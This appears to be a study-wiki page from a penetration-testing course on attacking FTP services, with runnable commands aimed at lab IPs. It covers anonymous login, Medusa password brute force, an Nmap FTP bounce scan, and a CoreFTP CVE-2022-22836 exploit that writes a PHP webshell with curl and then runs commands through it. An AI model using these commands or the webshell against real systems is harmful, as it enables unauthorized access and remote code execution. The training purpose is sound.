---
tags: [attack, enumeration/ftp, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 2
---

# Attacking FTP

Exploitation techniques for FTP services: anonymous access, credential brute force, bounce attacks, and known CVEs.

## Overview

FTP (TCP/21) is a frequent target because it often stores sensitive files, may allow anonymous login, and historically has had serious vulnerabilities. After enumeration confirms FTP is running, check anonymous access first, then brute-force, then probe for known vulnerabilities.

See [[enumeration/ftp]] for fingerprinting, banner grabbing, and config review before attacking.

## Anonymous login

```bash
ftp 10.129.14.136
# Username: anonymous  Password: (blank or any@email.com)

# Check for write permissions after login
ftp> ls -la
ftp> put testfile.txt
```

If anonymous login succeeds, search for credentials files, configs, and staging data immediately.

## Brute force with Medusa

```bash
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

Medusa is faster than Hydra for FTP when targeting a single user. For a user list:

```bash
medusa -U users.txt -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

## FTP bounce attack

The FTP PORT command can force an FTP server to scan internal hosts on your behalf, bypassing firewalls.

```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

The `-b` flag points Nmap at the FTP server to proxy the scan. This reveals internal hosts unreachable from the attacker's position.

Requires: the FTP server must allow `PORT` commands to arbitrary addresses (increasingly rare but still found on legacy infrastructure).

## CVE-2022-22836 — CoreFTP Server path traversal

CoreFTP Server before build 727 allows arbitrary file write via HTTP `PUT` with path traversal in the filename.

```bash
# Write a webshell to a web-accessible path
curl -k -X PUT -H "Host: 10.129.203.7" --basic \
     -u admin:admin \
     --data-binary "<?php echo shell_exec($_GET['c']);?>" \
     "https://10.129.203.7:443/../../../../../../xampp/htdocs/webshell.php"
```

The traversal escapes the FTP root. Once the webshell is written, execute commands:

```bash
curl http://10.129.203.7/webshell.php?c=dir
```

## Gotchas & notes

- FTP transfers in `PASV` mode; ensure your egress allows the data port range
- `Restricted Admin Mode` matters for RDP PTH but not FTP — don't confuse
- FTP bounce scanning is loud; use sparingly and with client permission
- CoreFTP uses HTTPS (443) for its management interface, hence `-k` (skip cert)

## Related pages

- [[enumeration/ftp]]
- [[tools/attack/medusa]]
- [[tools/enumeration/nmap]]
- [[wordlists/use_cases]]
- [[labs/htb/attacking_common_services/easy_skill_assessment]] — CoreFTP CVE-2022-22836 path traversal + MySQL OUTFILE chain to RCE

## Sources

- raw/attacking_common_services/ftp_attacking_ftp.md
- raw/attacking_common_services/ftp_latest_ftp_vulnerabilities.md
